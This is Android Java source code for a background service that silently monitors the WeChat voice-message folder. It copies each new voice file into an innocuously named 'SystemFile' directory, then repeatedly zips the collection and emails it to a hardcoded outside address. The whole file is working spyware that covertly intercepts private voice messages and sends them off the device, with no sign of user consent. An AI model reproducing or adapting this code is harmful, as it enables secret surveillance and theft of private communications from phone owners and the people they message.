package com.mail.service;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import com.alibaba.fastjson.JSONArray;
import com.mail.filemonitor.FileListener;
import com.mail.filemonitor.FileMonitor;
import com.mail.interfaces.MyInterface;
import com.mail.utils.MethodUtil;
import com.mail.utils.MyApplication;
import com.mail.utils.Preferences;
import com.mail.utils.ZipUtils;
import com.shidian.mail.SendMailUtil;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Copyright © CapRobin
 * <p>
 * Name：MyService
 * Describe：自定义Service服务类
 * Date：2021-05-06 19:54:26
 * Author: YuFarong CapRobin@yeah.net
 */
public class MyService extends Service implements MyInterface.ActivityCallBack {
    static String sdPath = Environment.getExternalStorageDirectory().getAbsolutePath();
    static String savedPath = sdPath + "/SystemFile/VoiceBak/";
    private List<String> fileNameList = new ArrayList();
    JSONArray jsonArray = new JSONArray();
    LinkedList<File> fileList = new LinkedList<>();
    public Preferences preference;
    //间隔周期:1天
//    private static final long PERIOD_DAY = 24 * 60 * 60 * 1000;
    private static final long PERIOD_DAY = 60000;

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.v("onBind", "MyService onBind----------------------------->>");
        return null;
    }

    @Override
    public void onCreate() {
        Log.v("onCreate", "MyService onCreate----------------------------->>");
        super.onCreate();
    }

    @Override
    public void onStart(Intent intent, int startId) {
        Log.v("onStart", "MyService onStart----------------------------->>");
        super.onStart(intent, startId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。
        ExecutorService threadPool = Executors.newCachedThreadPool();
        //启动文件监听线程
        threadPool.execute(new Runnable() {
            @Override
            public void run() {
                System.out.print("启动文件监听线程----------------------------->>");
                //启动文件监听线程
                fileListener();
            }
        });
        //启动定时发送邮件线程
        threadPool.execute(new Runnable() {
            @Override
            public void run() {
                System.out.print("启动定时发送邮件线程----------------------------->>");
                //启动定时发送邮件线程
                TimerTaskManager();
            }
        });
        //线程池周期性执行任务
//        threadPool.execute(new Runnable() {
//            @Override
//            public void run() {
//                int time = 0;
//                while (true) {
//                    try {
//                        //任务执行时间,此处设置1分钟执行一次任务
//                        Thread.sleep(60 * 1000);
//                        System.out.print("第" + (time + 1) + "次执行循环任务----------------------------->>");
//                    } catch (InterruptedException e) {
//                        e.printStackTrace();
//                    }
//                    time++;
//                }
//            }
//        });

        return super.onStartCommand(intent, flags, startId);
    }

    /**
     * Describe：启动文件监听服务
     * Params: []
     * Return: void
     * Date：2021-05-26 13:33:34
     */
    public static void fileListener() {
        //判断SD卡是否存在
        boolean isHasSdCard = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
        if (isHasSdCard) {
            //获得SD卡根目录路径
            File sdDir = Environment.getExternalStorageDirectory();
            //指定监听文件目录(微信语音文件夹)
            String monitorPath = sdDir.getAbsolutePath() + File.separator + "Android" + File.separator + "data" + File.separator + "com.tencent.mm" + File.separator + "MicroMsg" + File.separator + "43088dfea1f698ddeae94f73c378d106" + File.separator + "voice2";
            try {
                //5秒循环执行一次
                FileMonitor m = new FileMonitor(10000);
                m.monitor(monitorPath, new FileListener());
                m.start();
                System.out.println("文件目录监听中------------------------------>>");
            } catch (Exception e) {
                e.printStackTrace();
            } finally {

            }
        }

    }

    /**
     * Describe：文件操作监听回调
     * Params: [optType, file]
     * Return: void
     * Date：2021-06-04 14:34:36
     */
    @Override
    public void listenerToServiceMsg(int optType, File file) {
        switch (optType) {
            case 1: //新建文件
                System.out.println("新建文件回调------------>>" + "name：" + file.getName() + "-----directory：" + file.getPath() + "\n\t");

                try {
                    //本地文件处理测试
//                    localFile(optType, file);

                    //获取文件存储时间
                    String name = file.getName();
                    String year = name.substring(14, 16);
                    String month = name.substring(10, 12);
                    String day = name.substring(12, 14);
                    String hour = name.substring(6, 8);
                    String minute = name.substring(8, 10);
                    String second = name.substring(4, 6);
//                    String wuser = name.substring(16, 23);
//                    String random = name.substring(23, 30);
                    // 拼接字符串
//                    String newName = year + "-" + month + "-" + day + "-" + hour + "-" + minute + "-" + second + "-" + wuser + "-" + random;
                    String timeStr = year + "-" + month + "-" + day + " " + hour + "-" + minute + "-" + second;
//                    fileNameList.add(file.getPath());
//                    fileList.add(file);
                    //判断本地是否有存储的文件
//                    String getJsonArrayStr = MyApplication.preference.getString("jsonArrayStr");
//                    if (!getJsonArrayStr.trim().equals("")) {
//                        //参数中有值
//                        jsonArray = JSONObject.parseArray(getJsonArrayStr);
//                    }
//
//                    JSONObject jsonObject = new JSONObject();
//                    jsonObject.put("optType", optType);
//                    jsonObject.put("name", file.getName());
//                    jsonObject.put("directory", file.getPath());
//                    jsonObject.put("time", timeStr);
//                    jsonArray.add(jsonObject);
//                    String jsonArrayStr = jsonArray.toJSONString();
//                    //本地存储新增数据文件记录
//                    MyApplication.preference.putString("jsonArrayStr", jsonArrayStr);
//                    System.out.println("jsonArrayStr---------------------->>" + jsonArrayStr);


                    //判断本地是否有存储的文件
                    String logStr = MyApplication.preference.getString("logStr");
                    String logStr1 = MyApplication.preference.getString("logStr1");
                    //本地存储新增数据文件记录
                    if (null == logStr || logStr.trim().isEmpty()) {
                        MyApplication.preference.putString("logStr", file.getPath());

                    } else {
                        MyApplication.preference.putString("logStr", logStr + "|" + file.getPath());
                    }
                    String logStr2 = MyApplication.preference.getString("logStr");
                    String listMeterId = String.valueOf(logStr2);
                    String[] fileArray = listMeterId.split("\\|");
                    System.out.println("logStr2---------------------->>" + logStr2);


                    //新增文件拷贝另存
                    boolean isCopyFile = MethodUtil.fileCopy(file.getPath(), savedPath + file.getName());
                    System.out.println("文件拷贝---------------------->>" + isCopyFile);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            case 2:
                //修改文件
                System.out.println("修改文件回调------------>>" + "name：" + file.getName() + "-----directory：" + file.getPath() + "\n\t");
                break;
            case 3:
                //删除文件
                System.out.println("删除文件回调------------>>" + "name：" + file.getName() + "-----directory：" + file.getPath() + "\n\t");
                break;
            default:
                break;
        }
    }


    /**
     * Describe：定时任务管理_发送邮件
     * Params: []
     * Return: void
     * Date：2021-06-04 14:09:55
     */
    public static void TimerTaskManager() {
        System.out.print("开始定时任务---------------->>\n\t");
        //设置指定执行时间
        Calendar calendar = Calendar.getInstance();
        /*** 定制每日9:00执行方法 ***/
        calendar.set(Calendar.HOUR_OF_DAY, 9);
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);
        //第一次执行定时任务的时间
        Date date = calendar.getTime();
        //如果第一次执行定时任务的时间 小于 当前的时间；此时要在 第一次执行定时任务的时间 加一天，以便此任务在下个时间点执行。如果不加一天，任务会立即执行。
        if (date.before(new Date())) {
            Calendar startDT = Calendar.getInstance();
            startDT.setTime(date);
            //设置指定执行周期，此处需要间隔一天执行
            startDT.add(Calendar.MILLISECOND, 20000);
            date = startDT.getTime();
        }
        String getDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date);
        //循环任务
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                // 逻辑处理
                sendEmailTask();
            }
        };

        //安排指定的任务在指定的时间开始进行重复的固定延迟执行。
        Timer timer = new Timer();
        // 指定时间开始执行task，然后每隔一个时间周期执行一次task
        timer.schedule(task, date, 20000);
    }

    /**
     * Describe：发送邮件任务
     * Params: []
     * Return: void
     * Date：2021-06-04 14:08:30
     */
    private static void sendEmailTask() {
        try {
            //判断当前时间是否与指定时间相等
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String nowTimeStr = sdf.format(new Date());
            File file1 = new File(savedPath);
            //当前时间大于指定时间
            if (file1.exists() && file1.isDirectory()) {
                if (file1.list().length > 0) {
                    //第一种方式压缩
//                    LinkedList<File> files = DirTraversal.listLinkedFiles(sdPath + "/SystemFile/VoiceBak");
//                    File fil = DirTraversal.getFilePath(sdPath + "/SystemFile/VoiceZip/", "VoiceBak(" + nowTimeStr + ").zip");
//                    ZipUtils.zipFiles(files, fil);

                    //第二种方式压缩
                    String fileStr = sdPath + "/SystemFile/VoiceZip/VoiceBak(" + nowTimeStr + ").zip";
                    ZipUtils.zip(sdPath + "/SystemFile/VoiceBak", fileStr);

                    System.out.println("文件已压缩---------------------->>压缩文件个数：" + file1.list().length);
//                    Thread.sleep(30000);

//                    //开始发送普通邮件
//                    SendMailUtil.send("756657266@qq.com");
                    //开始发送带附件的邮件
                    SendMailUtil.send(new File(fileStr), "756657266@qq.com");
                    System.out.println("邮件已发送---------------------->>");

                    //解压文件
                    //ZipUtils.unzip(pathString+"/Android/data/ZipData/YsTestData.zip", pathString+"/Android/data/ZipData/YsTestData");
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
//                    }
    }
}
